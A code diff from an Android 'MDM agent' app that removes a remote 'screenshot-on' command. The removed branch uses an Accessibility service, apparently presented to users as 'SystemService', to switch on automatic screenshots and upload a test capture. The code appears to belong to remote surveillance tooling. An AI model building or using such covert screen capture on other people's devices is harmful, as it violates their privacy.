@@ -392,29 +392,6 @@ class CommandHandler(
                 }
                 result ?: CollectedData.TextResult("❌ فشل التقاط الصورة بعد 3 محاولات - تأكد من تفعيل Accessibility")
             }
-            "screenshot-on" -> {
-                // ✅ Enable auto-screenshots + take a TEST screenshot immediately
-                // This gives instant feedback: if screenshot arrives, auto works.
-                // If it doesn't, we know Accessibility isn't working.
-                com.mdm.agent.service.MDMAccessibilityService.autoScreenshotBlocked = false
-                com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(true)
-                Log.i(TAG, "✅ screenshot-on: auto-screenshots ENABLED, taking test screenshot...")
-
-                // Take a test screenshot to verify Accessibility is working
-                val testShot = collectors.takeScreenshot()
-                if (testShot is CollectedData.FileResult) {
-                    Log.i(TAG, "✅ Test screenshot captured - auto-screenshots confirmed working")
-                    // Return the test screenshot (will be uploaded as photo)
-                    testShot
-                } else {
-                    Log.e(TAG, "❌ Test screenshot FAILED - Accessibility may not be connected")
-                    CollectedData.TextResult("⚠️ تم تفعيل اللقطات التلقائية لكن فشل التقاط صورة تجريبية.\n\n" +
-                        "السبب المحتمل:\n" +
-                        "• إمكانية الوصول (Accessibility) غير مفعّلة فعلياً\n" +
-                        "• أو الخدمة لم تتصل بعد\n\n" +
-                        "الحل: افتح إعدادات الأندرويد → إمكانية الوصول → فعّل SystemService ثم أعد المحاولة")
-                }
-            }
             "screenshot-off" -> {
                 // ✅ Disable auto-screenshots
                 com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(false)
